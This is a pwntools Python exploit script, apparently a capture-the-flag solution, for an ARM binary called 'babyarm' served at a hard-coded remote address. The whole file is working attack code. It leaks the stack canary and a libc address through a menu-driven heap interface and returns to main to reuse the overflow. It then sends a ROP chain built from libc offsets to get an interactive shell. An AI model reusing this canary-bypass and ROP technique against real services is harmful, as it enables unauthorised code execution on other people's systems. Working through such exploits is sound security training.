#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools

context.arch = "arm"
if args.REMOTE:
    r = remote("51.15.131.72", 9999)
else:
    if "-g" in sys.argv:
        r = process(["qemu-arm", "-g", "4444", "-L", "/usr/arm-linux-gnueabihf/", "./babyarm"])
    else:
        r = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf/", "./babyarm"])

def add(idx, content):
    r.sendlineafter("choice: ", "1")
    r.sendlineafter(": ", str(idx))
    r.sendlineafter(": ", content)

def show(idx):
    r.sendlineafter("choice: ", "2")
    r.sendlineafter(": ", str(idx))

def dele(idx):
    r.sendlineafter("choice: ", "3")
    r.sendlineafter(": ", str(idx))

def info():
    r.sendlineafter("choice: ", "4")

# leak canary
r.sendlineafter("Your name: ", p32(0x21059))
show(5)
r.recvuntil("Content: ")
canary = u32("\x00" + r.recv(3))
log.info("canary:" + hex(canary))

# ret2main
r.sendafter("choice: ", "A" * 16 + flat(
    canary,
    0,
    p16(0x0650+1)
))

# leak libc
r.sendafter("Your name: ", p32(0x21044) + p32(0x21044))
show(5)
r.recvuntil("Content: ")
libc_alarm = u32(r.recv(4))
libc_base = libc_alarm - 0x0025281
log.info(hex(libc_base))

# ret2main
r.sendafter("choice: ", "A" * 16 + flat(
    canary,
    0,
    p16(0x0650+1)
))

# rop
r.sendafter("Your name: ", p32(0) + p32(0x21080+8) + p32(0x10b08))

r.sendafter("choice: ", "A" * 16 + flat(
    canary,
    p32(0x21080),
    p16(0x0912+1)
))

r.send(flat(
    0, # r7
    0x10B08+1, # pop r3-r9, pc
    libc_base + 0x701a1 + 4,
    0, 0, 0,
    libc_base + 0x0CA3E4,
    0, 0, 0x10afd-2,
))
r.interactive()
